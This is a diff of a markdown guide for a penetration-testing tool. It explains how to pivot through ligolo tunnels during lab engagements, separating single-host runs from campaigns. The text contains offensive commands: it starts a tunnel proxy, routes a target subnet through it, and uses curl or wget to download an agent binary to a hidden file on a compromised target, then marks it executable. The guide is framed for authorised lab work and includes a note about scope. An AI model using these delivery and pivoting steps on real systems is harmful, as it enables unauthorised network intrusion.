@@ -6,8 +6,15 @@ infrastructure — most of the network is unreachable until a tunnel exists, and
 tunnel that died without you noticing looks exactly like a target with nothing
 open.
 
-**Register every tunnel in the campaign state** (`pwnloop route add …`) with a
-canary, so `pwnloop route check` can prove it still carries traffic.
+On a single machine this is usually one of two things: a service bound to
+`127.0.0.1` that the box will not expose, or a second interface — a docker
+network, a management NIC — visible only from inside. Both need nothing more
+than a forward or a SOCKS proxy, and both are ordinary steps in a machine run.
+
+*In a campaign*, additionally register every tunnel with a canary
+(`pwnloop route add … canary=<ip:port>`) so `pwnloop route check` can prove it
+still carries traffic. On a single host the tunnel dies with the engagement and
+there is nothing to track.
 
 ## Picking a mechanism
 
@@ -44,7 +51,7 @@ pwnloop x "tmux new -d -s ligolo '/opt/static/ligolo-proxy -selfcert -laddr 0.0.
 #    then route the target's subnet down the tunnel
 pwnloop x "ip route add 172.16.1.0/24 dev ligolo"
 
-# 5. tell the campaign about it
+# 5. campaign only — register it so a later session can verify it
 pwnloop route add subnet=172.16.1.0/24 via=10.10.110.100 type=ligolo \
                   listener=11601 canary=172.16.1.5:445
 ```
@@ -116,7 +123,8 @@ it during cleanup).
 
 ```bash
 # serve from the engagement's www/ over the tunnel you already have
-pwnloop x "cd /campaigns/$LAB/hosts/$IP/www && tmux new -d -s http 'python3 -m http.server 8000'"
+# machine run:  /engagements/<name>/www     campaign:  /campaigns/<lab>/hosts/<ip>/www
+pwnloop x "cd /engagements/$NAME/www && tmux new -d -s http 'python3 -m http.server 8000'"
 # linux target
 curl http://<tun0-ip>:8000/ligolo-agent -o /tmp/.a && chmod +x /tmp/.a
 wget -q http://<tun0-ip>:8000/ligolo-agent -O /tmp/.a    # no curl
@@ -180,7 +188,7 @@ nothing where it used to return ports.
 
 ```bash
 pwnloop vpn-status                 # always check this first
-pwnloop route check                # canaries tell you which tunnels are real
+pwnloop route check                # campaign only — canaries prove which tunnels are real
 pwnloop x "ip route | grep ligolo" # the interface can survive while the agent is gone
 pwnloop x "tmux capture-pane -pt ligolo | tail -20"
 ```
@@ -188,7 +196,7 @@ pwnloop x "tmux capture-pane -pt ligolo | tail -20"
 Recovery order: VPN → proxy process → agent on the target (re-deliver and re-run)
 → session `start` in the console → `ip route add` → `route check` to confirm.
 Only then go back to whatever you were doing. Debugging a target through a dead
-tunnel is the single most common way to waste an hour on a campaign.
+tunnel is the single most common way to waste an hour on any engagement.
 
 Keep pivoting inside the lab. A route whose next hop leaves the lab's ranges is a
 scope question — stop and ask.
